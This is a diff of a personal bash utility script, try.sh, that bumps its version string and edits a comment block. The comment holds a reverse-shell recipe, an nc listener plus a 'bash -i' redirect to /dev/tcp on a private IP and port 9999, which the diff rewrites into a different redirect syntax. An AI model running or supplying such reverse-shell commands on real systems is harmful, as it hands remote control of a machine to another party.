@@ -7,7 +7,7 @@ if [[ ${DEBUG-} =~ ^1|yes|true$ ]]; then
     export PS4='[\D{%FT%TZ}] ${BASH_SOURCE}:${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
     set -o xtrace
 fi
-VERSION+=("try.sh - eb2a06d - 2021-10-15T09:05:58+08:00")
+VERSION+=("try.sh - d56cb10 - 2021-10-19T10:19:41+08:00")
 [ -e ${DIRNAME}/functions.sh ] && . ${DIRNAME}/functions.sh || true
 ##################################################
 cleanup() {
@@ -331,7 +331,7 @@ EOF
 # cat a.xml | xmlstarlet ed -u "domain/currentMemory[@unit='KiB']" -v 1111
     # reverse-shell
     # local<192.168.168.A>  run: nc -lp9999
-    # remote<192.168.168.B> run: bash -i >& /dev/tcp/192.168.168.A/9999 0>&1
+    # remote<192.168.168.B> run: bash -i &> /dev/tcp/192.168.168.A/9999 0>&1
     return 0
 }
 main "$@"
